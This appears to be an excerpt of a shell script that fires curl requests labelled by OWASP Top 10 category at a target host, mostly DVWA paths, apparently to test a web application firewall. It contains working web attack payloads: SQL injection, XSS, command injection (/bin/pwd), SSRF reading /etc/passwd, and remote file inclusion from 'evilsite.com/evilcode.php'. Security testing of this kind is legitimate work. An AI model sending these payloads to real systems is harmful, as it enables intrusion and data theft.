...
curl -A ZXY -k -s https://$HOST/.git/HEAD 
#

#echo -n "OWASP Top 10 A02:2021 - Cryptographic Failures :  "
curl -A ZXY -k -s -I --tlsv1.2 https://$HOST/ | grep HTTP
curl -A ZXY -k -s -I --tlsv1.3 https://$HOST/ | grep HTTP
#

#echo -n "OWASP Top 10 A03:2021 – Injection :  "
curl -A ZXY -k -s https://$HOST/?q=/bin/pwd 
#

#echo -n "OWASP Top 10 A05:2021 - Security Misconfiguration :  "
curl -A ZXY -k -s https://$HOST/admin/ 
#

#echo -n "OWASP Top 10 A04:2017 - XML External Entities (XXE) :  "
curl -A ZXY -k -s –X POST https://$HOST \
...
curl -A ZXY -k -s https://$HOST/?q=%7B%22username%22%3A%271%27or%271%27%3D%271%22%2C+%22attack_type%22%3A+%22deserialization%22%7D 
#

#echo -n "OWASP Top 10 A10:2021 – Server-Side Request Forgery :  "
curl -A ZXY -k -s https://$HOST \
-H 'Referer: https://$RFQDN/' \
-d 'test=file:///etc/passwd' 
#

#echo -n "SQL Injection (SQLi) :  "
curl -A ZXY -k -s https://$HOST/DVWA/?q='+or+1=1+--' 
#

#echo -n "Cross Site Scripting (XSS) :  "
curl -A ZXY -k -s https://$HOST/DVWA/status?q=%3Cscript%3Ealert\(1\) 
#

#echo -n "Local File Inclusion :  "
curl -A ZXY -k -s https://$HOST/DVWA/.git/HEAD 
#

#echo -n "Remote File Inclusion :  "
curl -A ZXY -k -s https://$HOST/DVWA/?rfi=https://$RFQDN/ 
#

#echo -n "PHP Code Injection :  "
curl -A ZXY -k -s https://$HOST/DVWA/?page=http://evilsite.com/evilcode.php 
#

#echo -n "HTTProxy :  "
curl -A ZXY -k -s https://$HOST/DVWA/ \
-H 'Proxy: AFFECTED' 
#
...
curl -A ZXY -k -s https://$HOST/DVWA/?q=/bin/who 
#
...
curl -A ZXY -k -s -X POST https://$HOST/DVWA/login.php \
-H 'Host: www.example.com' \
...
curl -A ZXY -k -s -X POST https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http:// www.example.com' \
...
curl -A ZXY -k -s -X FORBIDDEN-METHOD https://$HOST/DVWA/ \
-H 'Host: www.example.com' \
-H 'Referer: http://www.example.com' 
#
...
#echo -n "Bad Redirect :  "
curl -A ZXY -k -s https://$HOST/DVWA/redirect.php?goto=https://$RFQDN/ 
#
